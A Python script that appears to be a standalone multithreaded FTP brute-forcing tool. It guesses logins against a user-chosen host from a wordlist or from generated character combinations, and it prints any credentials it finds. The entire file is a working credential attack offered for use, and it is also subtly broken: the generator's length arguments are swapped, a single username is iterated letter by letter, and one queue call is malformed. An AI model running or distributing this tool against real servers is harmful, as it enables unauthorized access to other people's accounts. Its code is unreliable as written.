import ftplib
from threading import Thread
import queue
from colorama import init,Fore as fo
import itertools
import argparse
import string
import sys
import os

q = queue.Queue()


def load_list(file):
    with open(file,'r',errors = "ignore")as f:
        for line in f:
            yield line.strip()

def connect_ftp(host,port,q):
    while True:
        user,password = q.get()
        try:
            with ftplib.FTP() as server:
                print(f'[!]Trying : {password}')
                server.connect(host,port,timeout=5)
                server.login(user,password)

                print(f"{fo.GREEN}[+]Found Credentials[+]\n\t{fo.BLUE}Host : {host}\n\tuser : {user}\n\tpassword : {password}{fo.RESET}")

                with q.mutex:
                    q.queue.clear()
                    q.all_tasks_done.notify_all()
                    q.unfinished_tasks = 0
        except ftplib.error_perm:
            pass
        except Exception as e:
            print(f'{fo.RED} Exception : {str(e)}{fo.RESET}')
        finally:
            q.task_done()

def gen_pass(max,min,chars):
    for length in range(min,max+1):
        for pwd in itertools.product(chars,repeat = length):
            yield ''.join(pwd)

if __name__=="__main__":
    parser = argparse.ArgumentParser(description="FTP BruteForcer")
    parser.add_argument('--host',type =str,required=True,help='FTP server Host')
    parser.add_argument('--port',type = int,help='Server Port number',default=21)
    parser.add_argument('-t','--threads',type = int,default=30,help="number of parallel workers")
    parser.add_argument('-u','--user',help='username')
    parser.add_argument('--userlist',help='list of usernames')
    parser.add_argument('-w','--wordlist',help='wordlist')
    parser.add_argument('-g','--generate',action="store_true",help='Generate passwords')
    parser.add_argument('--min',type = int,help='minimum length',default = 1)
    parser.add_argument('--max',type=int,help='maximum length',default = 4)
    parser.add_argument('-c','--chars',help='Character set',default = string.ascii_letters+string.digits)

    args = parser.parse_args()

    host = args.host
    port = args.port
    n_threads = args.threads

    user = args.user
    userlist = args.userlist

    min = args.min
    max = args.max
    chars = args.chars
    
    threads = args.threads
    if not user and not userlist and not args.generate:
        print("No username(s) provided")
        sys.exit(1)

    if args.wordlist:
        passes = load_list(args.wordlist)
    elif args.generate:
        passes = gen_pass(min,max,chars)
    else:
        print('passwords not provided')
        sys.exit(1)

    if userlist:
        users = load_list(userlist)
    else :
        users = user
    
    for u in users:
        for p in passes:
            q.put((u,p))
    
    else:
        for p in passes:
            q.put(user,p)
    
    for _ in range(n_threads):
        thread = Thread(target=connect_ftp,args=(host,port,q))
        thread.daemon = True
        thread.start()
    q.join()

